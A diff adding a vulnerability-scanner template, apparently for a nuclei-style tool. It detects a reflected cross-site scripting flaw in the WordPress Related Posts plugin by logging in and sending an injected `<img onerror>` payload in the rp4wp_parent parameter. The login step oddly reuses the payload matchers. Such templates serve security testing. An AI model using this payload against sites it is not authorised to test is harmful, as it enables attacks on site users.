@@ -1,0 +1,55 @@
+id: wp-related-post-xss
+brief:
+    title: WordPress Related Posts <= 2.1.1 - Cross Site Scripting
+    by: arafatansari
+    level: medium
+    about: WordPress Related Posts plugin before 2.1.1 contains an Reflected XSS via rp4wp_parent
+    label:
+        - wp-plugin
+        - xss
+        - relatedposts
+        - authenticated
+        - huntr
+        - wordpress
+        - wp
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In
+      signs:
+        - "on": word
+          has:
+            - <img src=x onerror=alert(document.domain)>&action=edit
+            - All Posts</a>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E'
+      signs:
+        - "on": word
+          has:
+            - <img src=x onerror=alert(document.domain)>&action=edit
+            - All Posts</a>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
